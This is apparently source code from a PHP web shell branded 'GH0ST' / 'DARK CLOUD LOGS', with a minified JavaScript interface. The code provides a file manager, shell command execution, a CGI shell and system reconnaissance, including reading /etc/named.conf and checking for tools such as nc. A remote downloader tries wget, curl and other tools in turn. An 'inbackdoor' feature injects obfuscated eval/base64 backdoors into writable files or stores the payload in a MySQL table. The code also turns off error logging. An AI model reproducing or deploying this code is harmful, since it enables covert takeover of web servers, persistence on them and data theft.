.tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("GH0ST_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return GH0STSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=GH0STb64(t)),void 0!==l&&null!=l&&0!=l.length)n=GH0STb64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=GH0STb64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),GH0STloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?GH0STloader(b,"block"):(GH0STloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+GH0STb64("FilesTools")+"&c="+GH0STb64(f)+"&GH0ST1="+GH0STb64(e)+"&GH0ST2="+GH0STb64(a)+"&GH0ST3="+r+"&GH0ST4="+n+"&GH0ST5=&GH0ST6=&GH0ST7=&GH0ST8=&GH0ST9=&GH0ST10=&&ajax="+GH0STb64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),GH0STShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&GH0STUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?GH0STLoaderOnTop("none"):GH0STloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&GH0STShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&GH0STShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),GH0STLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function GH0STLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("GH0ST-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="GH0ST-ace-plugin",t.onload=function(){GH0STLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==GH0ST_ace_editors.editor&&(GH0ST_ace_editors.editor={});var i=getCookie("GH0ST_ace_theme_editor"),l=getCookie("GH0ST_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),GH0ST_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),GH0ST_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),GH0ST_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),GH0ST_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),GH0ST_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),GH0ST_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),GH0ST_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){GH0ST_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==GH0ST_ace_editors.eval&&(GH0ST_ace_editors.eval={});i=getCookie("GH0ST_ace_theme_eval"),l=getCookie("GH0ST_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),GH0ST_ace_editors.eval["phpeval-"+o]=ace.edit(t),GH0ST_ace_editors.eval["phpeval-"+o].setReadOnly(a),GH0ST_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),GH0ST_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),GH0ST_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),GH0ST_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){GH0ST_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+GH0STb64("checkfiletype")+"&path="+GH0STb64(editor_files[t].pwd)+"&arg="+GH0STb64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","GH0ST","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("GH0ST_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=GH0ST_ace_editors.editor[e].selection.toJSON();GH0ST_ace_editors.editor[e].selectAll(),GH0ST_ace_editors.editor[e].focus(),document.execCommand("copy"),GH0ST_ace_editors.editor[e].selection.fromJSON(a),GH0STShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=GH0STb64(e,!0),a=GH0STb64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return GH0STb64(i,!0)}function reloadSetting(e){return GH0STloader(GH0ST_before_do_action_id,"block"),_Ajax(d.URL,"a="+GH0STb64("settings")+"&GH0ST1="+GH0STb64(e.protect.value)+"&GH0ST2="+GH0STb64(e.lgpage.value)+"&GH0ST3="+GH0STb64(e.username.value)+"&GH0ST4="+GH0STb64(e.password.value)+"&GH0ST5="+GH0STb64(">>")+"&GH0ST6="+GH0STb64(e.icon.value)+"&GH0ST7="+GH0STb64(e.post_encrypt.value)+"&GH0ST8="+GH0STb64("main")+"&GH0ST9="+GH0STb64(e.cgi_api.value)+"&c="+GH0STb64(c_)+"&ajax="+GH0STb64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),GH0STloader(a,"none")},!1,GH0ST_before_do_action_id),GH0ST_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+GH0STb64("settings")+"&GH0ST1="+GH0STb64(JSON.stringify(a))+"&GH0ST2="+GH0STb64(">>")+"&GH0ST3="+GH0STb64(t)+"&GH0ST8="+GH0STb64("color")+"&c="+GH0STb64(c_)+"&ajax="+GH0STb64("true"),function(e){evalJS(e)},!0)}function GH0STb64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __GH0ST_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=GH0ST_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+GH0STb64("cgishell")+"&GH0ST1="+GH0STb64(e)+"&ajax="+GH0STb64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
</script>
...
$cmd_uname = GH0STEx("uname -a",false,false);
...
for($s=1;$s<=10;$s++){
echo '<input type="hidden" name="GH0ST'.$s.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__GH0ST_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__GH0ST_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="DARK CLOUD LOGS 2012" draggable="false" src="https://i.ibb.co.com/15JX7GQ/20251031-123133.png" /></td>
</tr>
<tr>
...
if($GLOBALS['sys']=='unix'){
$d0mains = _GH0ST_file("/etc/named.conf",false);
...
<td><span class="header_vars">Total:</span><b>'.GH0STSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . GH0STSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
...
if(!@ini_get('safe_mode')){
if(strlen(GH0STEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bziGH0ST2','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(GH0STWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
...
$x=0;
foreach($downloaders as $item2)if(GH0STWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
...
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.GH0ST_GetDisable_Function().'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="GH0ST_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
</tr>
<tr>
...
echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="GH0ST_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
}
echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="GH0ST_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">GH0ST Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="GH0ST_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="GH0ST_plus">GH0ST market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="GH0ST_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['GH0STUser']) && !empty($_COOKIE['GH0STPass']) ? '<a href="javascript:void(0);" onclick="GH0STLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="GH0STFilesmanTabShowTitle(this,event);" onmouseout="GH0STFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="GH0STFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
...
function GH0STlogout(){
@setcookie("GH0STUser", null, 2012);
@setcookie("GH0STPass", null, 2012);
unset($_COOKIE['GH0STUser'],$_COOKIE['GH0STPass']);
echo("ok");
}
...
function __showicon($r){
	$s['btn']='https://i.ibb.co.com/15JX7GQ/20251031-123133.png';
	$s['GH0STmini']='https://i.ibb.co.com/15JX7GQ/20251031-123133.png';
	$s['loader']='http://solevisible.com/images/loader.svg';
	//return 'data:image/png;base64,'.__get_resource($s[$r]);
	return $s[$r];
}
function GH0STinbackdoor(){
GH0SThead();
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('DARK CLOUD LOGS is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='GH0ST'>DARK CLOUD LOGS Uploader</option><option value='my'>My Private Shell</option></select>";
$cwd = 'Example: /home/GH0ST/public_html/index.php';
if($_POST['GH0ST1']=='file'){
echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='GH0ST'> <input type='submit' value=' '>{$textarea}</form></p></center>");
if($_POST['GH0ST2']!=''&&$_POST['GH0ST3']!=''&&$_POST['GH0ST4']!=''){
$method = $_POST['GH0ST2'];
$file = $_POST['GH0ST3'];
$shell = $_POST['GH0ST4'];
$key = str_replace(array('"','\''),'',trim($_POST['GH0ST5']));
if($key=='')$key='GH0ST';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__GH0ST_SHELL_CODE'];}
$code = '<?php if(isset($_GET["GH0ST"])&&$_GET["GH0ST"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?GH0ST=".$key.'</font>');}else{__alert($error);}}}
if($_POST['GH0ST1']=='db'){
...
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'GH0ST', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['GH0ST2']!=''&&$_POST['GH0ST3']!=''&&$_POST['GH0ST5']!=''&&$_POST['GH0ST6']!=''){
$dbhost = $_POST['GH0ST2'];
$dbuser = $_POST['GH0ST3'];
$dbpw = $_POST['GH0ST4'];
$dbname = $_POST['GH0ST5'];
...
$method = $_POST['GH0ST7'];
$shell = $_POST['GH0ST8'];
$key = str_replace(array('"','\''),'',trim($_POST['GH0ST9']));
if($key=='')$key='GH0ST';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__GH0ST_SHELL_CODE'];}
if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
$code = '<?php if(isset($_GET["GH0ST"])&&$_GET["GH0ST"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM GH0ST_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `GH0ST_bc`');
@mysqli_query($conn,'CREATE TABLE `GH0ST_bc` (code LONGTEXT)');
@mysqli_query($conn,'INSERT INTO `GH0ST_bc` VALUES("'.$shell.'")');
@file_put_contents($file,$code."\n".@file_get_contents($file));
__alert($success."<br>Run With: ".basename($file)."?GH0ST=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
GH0STfooter();
}
function GH0STwhois(){
...
if($_POST['GH0ST2']=='>>'&&!empty($_POST['GH0ST1'])){
$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['GH0ST1']);
$target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
$data = @file_get_contents($target);
if($data==''){$get = new GH0STCURL();$get->ssl = true;$data = $get->Send($target);}
$target = @json_decode($data,true);
echo __pre();
if(is_array($target)){echo($target["whois_raw"]);}else{echo GH0STEx("whois ".$site);}}
echo("</div>");
}
function GH0STremotedl(){
GH0SThead();
...
if(isset($_POST['GH0ST1'],$_POST['GH0ST2'],$_POST['GH0ST3'])&&!empty($_POST['GH0ST1'])&&$_POST['GH0ST3']=='>>'){
echo __pre();
$url = $_POST['GH0ST1'];
$path = $_POST['GH0ST2'];
echo('<center>');
...
$buff = GH0STEx("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = GH0STEx("curl ".$url." -o ".$saveas);
if(@is_file($saveas)) return true;
$buff = GH0STEx("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = GH0STEx("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = GH0STEx("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = GH0STEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = GH0STEx("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
...
if(empty($content)||!$content){
	$content = GH0STEx("cat '".addslashes($file)."'");
}
return $content;
}
function GH0STMarket(){
...
if($data["status"] == "open"){
	...
	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the GH0ST market....! try later.</div>";
}
echo "</div>";
}
function GH0STSettings(){
GH0SThead();
GH0STNum(6,7,8,9,10);
...
foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['GH0ST9'])&&$_POST['GH0ST9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['GH0ST9'])?'selected':'')).'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['GH0ST7'])&&$_POST['GH0ST7']==$key?"selected":(__GH0ST_POST_ENCRYPTION__&&empty($_POST['GH0ST7'])?'selected':'')).'>'.$val.'</option>';
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['GH0ST3'])?$GLOBALS['DB_NAME']['user']:$_POST['GH0ST3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['GH0ST5']=='>>'){
echo __pre();
if(!empty($_POST['GH0ST3'])){
$protect = $_POST['GH0ST1'];
$lgpage = $_POST['GH0ST2'];
$username = $_POST['GH0ST3'];
$password = md5($_POST['GH0ST4']);
$icon = $_POST['GH0ST6'];
$post_encrypt = $_POST['GH0ST7'];
$cgi_api_val = $_POST['GH0ST9'];
...
if(!empty($_POST['GH0ST4'])&&preg_match($find_pw,$data,$e)){
...
